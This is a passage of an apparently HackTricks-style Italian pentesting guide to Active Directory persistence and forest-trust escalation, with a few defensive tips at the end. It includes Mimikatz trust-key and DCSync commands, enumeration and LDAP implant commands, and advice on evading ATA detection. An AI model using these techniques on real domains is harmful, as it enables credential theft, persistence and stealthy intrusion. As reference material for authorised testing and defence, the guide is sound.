Un **Golden Ticket attack** comporta che un attaccante ottenga accesso all'**NTLM hash dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Tickets (TGTs)**, essenziali per l'autenticazione nella rete AD.

Una volta che l'attaccante ottiene questo hash, può creare **TGTs** per qualsiasi account scelto (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Questi sono simili ai golden tickets, forgiati in modo da **bypassare i comuni meccanismi di rilevamento dei golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avere i certificati di un account o poterli richiedere** è un ottimo modo per persistere nell'account utente (anche se l'utente cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usare certificati permette anche di persistere con privilegi elevati all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory assicura la sicurezza dei **gruppi privilegiati** (come Domain Admins ed Enterprise Admins) applicando una **Access Control List (ACL)** standard su questi gruppi per prevenire modifiche non autorizzate. Tuttavia, questa funzionalità può essere sfruttata; se un attaccante modifica l'ACL di AdminSDHolder per concedere pieno accesso a un utente normale, quell'utente ottiene ampio controllo su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro se non monitorata attentamente.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

All'interno di ogni **Domain Controller (DC)** esiste un account **administrator locale**. Ottenendo diritti di admin su una macchina di questo tipo, l'hash dell'Administrator locale può essere estratto usando **mimikatz**. Successivamente è necessaria una modifica del registro per **abilitare l'uso di questa password**, permettendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **concedere** alcune **permissioni speciali** a un **utente** su specifici oggetti di dominio che permetteranno all'utente di **escalare privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** sono usati per **memorizzare** le **permissioni** che un **oggetto** ha **su** un altro **oggetto**. Se puoi solo **apportare una piccola modifica** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza necessitare di essere membro di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa della auxiliary class `dynamicObject` per creare principali/GPO/DNS record a vita breve con `entryTTL`/`msDS-Entry-Time-To-Die`; si auto-eliminano senza tombstone, cancellando le prove LDAP lasciando SIDs orfani, riferimenti `gPLink` rotti o risposte DNS cacheate (ad es., AdminSDHolder ACE pollution o `gPCFileSysPath` malevoli/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Alterare **LSASS** in memoria per stabilire una **password universale**, concedendo accesso a tutti gli account del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **SSP** per **catturare** in **clear text** le **credenziali** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** in AD e lo usa per **pushare attributi** (SIDHistory, SPNs...) su oggetti specificati **senza** lasciare **log** riguardo le **modifiche**. Hai bisogno di privilegi DA e di essere dentro il **root domain**.\
Nota che se usi dati errati, appariranno log piuttosto brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo discusso come elevare privilegi se si hanno **permessi sufficienti per leggere le password LAPS**. Tuttavia, queste password possono anche essere usate per **mantenere la persistenza**.\
Vedi:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera la **Forest** come il confine di sicurezza. Questo implica che **compromettere un singolo dominio potrebbe potenzialmente portare al compromesso dell'intera Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che permette a un utente di un **dominio** di accedere a risorse in un altro **dominio**. Crea un collegamento tra i sistemi di autenticazione dei due domini, permettendo il flusso di verifiche di autenticazione. Quando i domini impostano una trust, scambiano e conservano chiavi specifiche all'interno dei loro **Domain Controller (DC)**, fondamentali per l'integrità della trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **dominio trusted**, deve prima richiedere un TGT inter-realm dal proprio DC di dominio. Questo TGT è cifrato con una **chiave di trust** condivisa che entrambi i domini hanno concordato. L'utente presenta quindi questo TGT al **DC del dominio trusted** per ottenere un ticket di servizio (**TGS**). Dopo la verifica del TGT inter-realm da parte del DC del dominio trusted, questo emette un TGS, concedendo all'utente l'accesso al servizio.

**Passi**:

1. Un **computer client** in **Domain 1** inizia il processo usando il suo **NTLM hash** per richiedere un **Ticket Granting Ticket (TGT)** al suo **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client è autenticato con successo.
3. Il client richiede quindi un **inter-realm TGT** da DC1, necessario per accedere a risorse in **Domain 2**.
4. L'inter-realm TGT è cifrato con una **trust key** condivisa tra DC1 e DC2 come parte della trust bidirezionale.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2)** di Domain 2.
6. DC2 verifica l'inter-realm TGT usando la trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server in Domain 2 a cui il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è cifrato con l'hash dell'account del server, per ottenere l'accesso al servizio in Domain 2.

### Different trusts

È importante notare che **una trust può essere a 1 via o a 2 vie**. Nella configurazione a 2 vie, entrambi i domini si fidano l'uno dell'altro, ma nella relazione di trust **a 1 via** uno dei domini sarà il **trusted** e l'altro il dominio **trusting**. In quest'ultimo caso, **potrai accedere solo alle risorse all'interno del dominio trusting partendo dal dominio trusted**.

Se Domain A si fida di Domain B, A è il dominio trusting e B è quello trusted. Inoltre, in **Domain A**, questa sarà una **Outbound trust**; e in **Domain B**, questa sarà una **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Configurazione comune all'interno della stessa forest, dove un dominio child ha automaticamente una trust transitiva bidirezionale con il dominio parent. Ciò significa che le richieste di autenticazione possono fluire senza soluzione di continuità tra parent e child.
- **Cross-link Trusts**: Chiamate "shortcut trusts", sono stabilite tra domini child per accelerare i processi di referral. In forest complesse, i referral di autenticazione tipicamente devono viaggiare fino alla root della forest e poi giù fino al dominio target. Creando cross-links, il percorso si abbrevia, utile specialmente in ambienti geograficamente distribuiti.
- **External Trusts**: Stabilite tra domini differenti e non correlati e sono non-transitive. Secondo la documentazione di [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), le external trusts sono utili per accedere a risorse in un dominio fuori dalla forest corrente che non è collegato tramite forest trust. La sicurezza è rafforzata tramite SID filtering con le external trusts.
- **Tree-root Trusts**: Queste trust vengono stabilite automaticamente tra il dominio root della forest e un nuovo tree root aggiunto. Pur non essendo comuni, le tree-root trusts sono importanti per aggiungere nuovi tree di dominio a una forest, permettendo loro di mantenere un nome di dominio unico e garantendo transitivity bidirezionale. Ulteriori informazioni nella [guida Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Tipo di trust bidirezionale transitivo tra due forest root domains, applicando anche SID filtering per migliorare le misure di sicurezza.
- **MIT Trusts**: Trust stabilite con domini Kerberos non-Windows conformi a [RFC4120](https://tools.ietf.org/html/rfc4120). Le MIT trusts sono più specializzate e servono a integrare sistemi Kerberos esterni all'ecosistema Windows.

#### Altre differenze nelle **trusting relationships**

- Una relazione di trust può essere anche **transitiva** (A si fida di B, B si fida di C, allora A si fida di C) o **non-transitiva**.
- Una relazione di trust può essere configurata come **bidirectional trust** (entrambi si fidano reciprocamente) o come **one-way trust** (solo uno dei due si fida dell'altro).

### Attack Path

1. **Enumerare** le relazioni di trust
2. Controllare se qualche **security principal** (user/group/computer) ha **accesso** a risorse dell'**altro dominio**, magari tramite voci ACE o essendo membro di gruppi dell'altro dominio. Cercare **relazioni across domains** (la trust è stata creata probabilmente per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Compromettere** gli **account** che possono **pivotare** attraverso i domini.

Gli attaccanti possono accedere a risorse in un altro dominio tramite tre meccanismi principali:

- **Local Group Membership**: Principals possono essere aggiunti a gruppi locali sulle macchine, come il gruppo “Administrators” su un server, concedendo loro controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: I principals possono anche essere membri di gruppi nel dominio esterno. Tuttavia, l'efficacia di questo metodo dipende dalla natura della trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: I principals potrebbero essere specificati in una **ACL**, particolarmente come entità in **ACEs** dentro una **DACL**, fornendo accesso a risorse specifiche. Per chi vuole approfondire la meccanica di ACL, DACL e ACE, il whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare i foreign security principals nel dominio. Questi saranno user/group provenienti da **un dominio/forest esterno**.

Puoi verificarlo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust di dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 chiavi attendibili**, una per _Child --> Parent_ e un'altra per _Parent_ --> _Child_.\
> Puoi ottenere quella usata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalare a Enterprise Admin sul dominio child/parent abusando del trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendere come il Configuration Naming Context (NC) possa essere sfruttato è cruciale. Il Configuration NC funge da repository centrale per i dati di configurazione nell'intera forest in ambienti Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) della forest, con i DC scrivibili che mantengono una copia scrivibile del Configuration NC. Per sfruttarlo, è necessario avere **privilegi SYSTEM su un DC**, preferibilmente un child DC.

**Link GPO to root DC site**

Il container Sites del Configuration NC include informazioni sui siti di tutti i computer uniti al dominio all'interno della forest AD. Operando con privilegi SYSTEM su qualsiasi DC, un attaccante può collegare GPO ai siti root dei DC. Questa azione può compromettere il dominio root manipolando le policy applicate a questi siti.

Per informazioni approfondite, si può consultare la ricerca su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vettore d'attacco consiste nel prendere di mira gMSA privilegiati all'interno del dominio. La KDS Root key, essenziale per calcolare le password dei gMSA, è memorizzata all'interno del Configuration NC. Con privilegi SYSTEM su qualsiasi DC, è possibile accedere alla KDS Root key e calcolare le password di qualsiasi gMSA nella forest.

Analisi dettagliata e guida passo-passo sono disponibili in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attacco MSA delegato complementare (BadSuccessor – abuso degli attributi di migrazione):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ulteriori ricerche esterne: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, in attesa della creazione di nuovi oggetti AD privilegiati. Con privilegi SYSTEM, un attaccante può modificare lo Schema AD per concedere a qualsiasi utente il controllo completo su tutte le classi. Ciò potrebbe portare ad accesso e controllo non autorizzati sugli oggetti AD appena creati.

Ulteriori letture disponibili su [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 mira a prendere il controllo sugli oggetti Public Key Infrastructure (PKI) per creare un certificate template che permette l'autenticazione come qualsiasi utente nella forest. Poiché gli oggetti PKI risiedono nel Configuration NC, compromettere un child DC scrivibile consente l'esecuzione degli attacchi ESC5.

Ulteriori dettagli su questo si possono leggere in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Nei casi in cui manca ADCS, l'attaccante può allestire i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### Dominio di una forest esterna - One-Way (Inbound) o bidirezionale
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo dominio è trusted** da un dominio esterno che ti concede **permessi indeterminati** su di esso. Dovrai trovare **quali principals del tuo dominio hanno quale accesso sul dominio esterno** e poi cercare di sfruttarlo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio forest esterno - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **il tuo dominio** sta **concedendo fiducia** di alcuni **privilegi** a un principal di **domini diversi**.

Tuttavia, quando un **dominio è trusted** dal dominio che si fida, il dominio trusted **crea un utente** con un **nome prevedibile** che usa come **password la trusted password**. Ciò significa che è possibile **accedere a un utente del dominio che si fida per entrare nel dominio trusted** per enumerarlo e cercare di scalare ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il dominio trusted è trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** della trust di dominio (cosa non molto comune).

Un altro modo per compromettere il dominio trusted è aspettare su una macchina dove un **utente del dominio trusted può effettuare il login** via **RDP**. Poi, l'attaccante potrebbe iniettare codice nel processo della sessione RDP e **accedere al dominio di origine della vittima** da lì.  
Inoltre, se la **vittima ha montato il suo hard disk**, dal processo della **sessione RDP** l'attaccante potrebbe posizionare **backdoor** nella **cartella di avvio dell'hard disk**. Questa tecnica è chiamata **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigazione dell'abuso delle trust di dominio

### **SID Filtering:**

- Il rischio di attacchi che sfruttano l'attributo SID history attraverso trust tra foreste è mitigato da SID Filtering, che è attivato di default su tutte le trust tra foreste. Questo si basa sull'assunzione che le trust intra-foresta siano sicure, considerando la foresta, piuttosto che il dominio, come confine di sicurezza secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: SID filtering può interrompere applicazioni e l'accesso degli utenti, portando alla sua occasional disattivazione.

### **Selective Authentication:**

- Per le trust tra foreste, l'uso di Selective Authentication assicura che gli utenti delle due foreste non siano autenticati automaticamente. Invece, sono richieste autorizzazioni esplicite per gli utenti per accedere a domini e server all'interno del dominio o della foresta che si fida.
- È importante notare che queste misure non proteggono contro lo sfruttamento del Configuration Naming Context (NC) scrivibile o attacchi sull'account di trust.

[**Maggiori informazioni sulle trust di dominio in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Abuso di AD basato su LDAP tramite implant on-host

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Enumerazione LDAP lato implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` risolvono nomi brevi/percorsi OU in DN completi ed estraggono gli oggetti corrispondenti.
- `get-object`, `get-attribute`, and `get-domaininfo` recuperano attributi arbitrari (inclusi security descriptors) più i metadata di forest/dominio da `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` espongono candidati al roasting, impostazioni di delega e descrittori esistenti di [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direttamente da LDAP.
- `get-acl` and `get-writable --detailed` analizzano la DACL per elencare trustee, diritti (GenericAll/WriteDACL/WriteOwner/attribute writes) e l'ereditarietà, fornendo bersagli immediati per l'escalation di privilegi via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitive di scrittura LDAP per escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) permettono all'operatore di predisporre nuovi principals o computer account ovunque esistano diritti sull'OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` dirottano direttamente i target una volta individuati i diritti di write-property.
- I comandi focalizzati sulle ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync` traducono WriteDACL/WriteOwner su qualsiasi oggetto AD in reset di password, controllo della membership di gruppi o privilegi DCSync senza lasciare artefatti PowerShell/ADSI. I counterpart `remove-*` ripuliscono gli ACE iniettati.

### Delegation, roasting, e abuso di Kerberos

- `add-spn`/`set-spn` rendono immediatamente un utente compromesso Kerberoastable; `add-asreproastable` (UAC toggle) lo marca per AS-REP roasting senza toccare la password.
- Le macro di Delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, flag UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando percorsi d'attacco constrained/unconstrained/RBCD ed eliminando la necessità di PowerShell remoto o RSAT.

### sidHistory injection, spostamento OU e modellazione della superficie d'attacco

- `add-sidhistory` inietta SID privilegiati nella SID history di un principal controllato (see [SID-History Injection](sid-history-injection.md)), fornendo ereditarietà di accesso furtiva completamente su LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo a un attaccante di spostare asset in OU dove esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember` o `add-spn`.
- Comandi di rimozione a scopo ristretto (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) consentono un rapido rollback dopo che l'operatore ha raccolto credenziali o stabilito persistence, minimizzando la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Alcune difese generali

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Misure difensive per la protezione delle credenziali**

- **Domain Admins Restrictions**: Si raccomanda che i Domain Admins siano autorizzati ad effettuare il login solo sui Domain Controller, evitando il loro utilizzo su altri host.
- **Service Account Privileges**: I servizi non dovrebbero essere eseguiti con privilegi Domain Admin (DA) per mantenere la sicurezza.
- **Temporal Privilege Limitation**: Per attività che richiedono privilegi DA, la loro durata dovrebbe essere limitata. Questo può essere ottenuto con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit degli Event ID 2889/3074/3075 e successiva applicazione di LDAP signing più LDAPS channel binding su DC/client per bloccare tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementazione di tecniche di deception**

- Implementare deception comporta predisporre trappole, come utenti o computer esca, con caratteristiche come password che non scadono o marcati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o l'aggiunta a gruppi ad alto privilegio.
- Un esempio pratico utilizza strumenti come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Ulteriori informazioni sul deployment di tecniche di deception sono disponibili su [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificare la deception**

- **For User Objects**: Indicatori sospetti includono ObjectSID atipico, logon rari, date di creazione e basso numero di bad password.
- **General Indicators**: Confrontare gli attributi degli oggetti potenzialmente esca con quelli genuini può rivelare incongruenze. Strumenti come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare tali deception.

### **Evitare i sistemi di rilevamento**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Evitare l'enumerazione delle sessioni sui Domain Controller per prevenire il rilevamento da parte di ATA.
- **Ticket Impersonation**: Utilizzare chiavi **aes** per la creazione di ticket aiuta a eludere il rilevamento non degradando a NTLM.
- **DCSync Attacks**: Si consiglia di eseguire da un non-Domain Controller per evitare il rilevamento ATA, poiché l'esecuzione diretta da un Domain Controller genererà allarmi.

## Riferimenti

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
